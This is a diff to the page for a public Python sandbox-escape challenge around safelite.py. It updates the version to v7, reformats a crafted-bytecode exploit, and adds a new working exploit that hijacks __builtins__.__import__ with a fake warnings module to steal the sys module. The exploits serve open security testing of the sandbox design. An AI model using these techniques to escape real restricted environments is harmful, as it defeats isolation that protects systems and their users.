@@ -16,7 +16,7 @@ The challenge is simple:
 
 You can find the latest version of safelite.py here:
 
-* http://release.plexnet.org/misc/cappython/safelite.py [Current: v6]
+* http://release.plexnet.org/misc/cappython/safelite.py [Current: v7]
 
 I will keep safelite.py updated as new exploits and workarounds are found until
 we hopefully end up with a version we can be confident about. [VERSION attribute
@@ -61,7 +61,7 @@ Good luck and thanks! =)
 
     >>> f.close() # creates an empty file called 'w00t'
 
-  [Fixed in v5]
+  [Fixed in v3]
 
 * `clsn <http://web.meson.org/>`_ took it further and bypassed the fix in v4:
 
@@ -115,7 +115,11 @@ Good luck and thanks! =)
   with his `super hardcore exploit
   <http://thepaulprog.blogspot.com/2009/02/safelite-exploit.html>`_:
 
-    >>> __builtins__.TypeError = type(lambda: 0)(type(compile('1', 'b', 'eval'))(2, 2, 4, 67, 'y\x08\x00t\x00\x00\x01Wn\x09\x00\x01\x01a\x00\x00n\x01\x00X|\x01\x00|\x00\x00\x83\x01\x00S', (None,), ('stuff',), ('g', 'x'), 'q', 'f', 1, ''), globals(), None, (TypeError,))
+    >>> __builtins__.TypeError = type(lambda: 0)(type(compile('1', 'b', 'eval'))(
+    ...   2, 2, 4, 67,
+    ...   'y\x08\x00t\x00\x00\x01Wn\x09\x00\x01\x01a\x00\x00n\x01\x00X|\x01\x00|\x00\x00\x83\x01\x00S',
+    ...   (None,), ('stuff',), ('g', 'x'), 'q', 'f', 1, ''), globals(), None, (TypeError,)
+    ... )
 
     >>> try:
     ...     FileReader('foo', 2)
@@ -126,5 +130,43 @@ Good luck and thanks! =)
 
   [Fixed in v6 -- but the principles can still be used. Paul Cannon `explains
   in depth <http://thepaulprog.blogspot.com/2009/02/safelite-exploit.html>`_.]
+
+* Daniel Diniz emailed in with this devastating mugging:
+
+  .. syntax:: python
+
+        from safelite import FileReader
+
+        # Let's build a fake module
+        warnings = __builtins__.__class__('warnings')
+
+        # Fill it with deception
+        warnings.default_action = "ignore"
+
+        # And provide a supporting thug
+        def __import__(*args):
+            print args
+            try:
+                print "How nice:\n", args[1].keys()
+                global sys
+                sys = args[1]['sys']
+            except Exception, v:
+                print "Exception:", v
+            return warnings
+
+        # Put the bogus module at the doorstep...
+        __builtins__.warnings = warnings
+
+        # and have the thug replacing the doorman
+        __builtins__.__import__ = __import__
+
+        # An unsuspecting costumer passes by...
+        FileReader('safelite.py').seek(1.1)
+
+        # ... and is brutally mugged :)
+        print sys
+        print dir(sys)
+
+  [Fixed in v7]
 
 Found an exploit yet?? Let me know!
